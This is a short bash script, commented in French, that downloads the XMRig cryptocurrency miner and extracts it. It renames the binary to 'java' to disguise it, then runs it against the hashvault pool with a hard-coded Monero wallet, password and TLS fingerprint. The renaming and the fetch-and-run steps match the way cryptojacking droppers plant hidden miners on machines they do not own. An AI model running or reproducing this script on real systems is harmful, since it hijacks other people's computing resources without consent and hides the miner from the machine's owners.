#!/bin/bash

# Création d'un dossier
mkdir -p jammy
cd jammy

# Téléchargement de l'archive
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz

# Extraction de l'archive
tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz

# Accéder au dossier extrait
cd xmrig-6.22.2

# Renommer le fichier xmrig
mv xmrig java

# Donner les permissions d'exécution
chmod +x java

# Exécution avec les paramètres spécifiques
./java --url pool.hashvault.pro:443 \
       --user solo:89ZaNLJadC7QXi2h5dtqVHiL7BLsEzw1LfBbRE6GWXVDFKdMJoi41XEjYaAhTKZMYR64Ltk3ZZ5modZXCVquyF4dNhqZ8MA \
       --pass Trayne1 \
       --donate-level 1 \
       --tls \
       --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
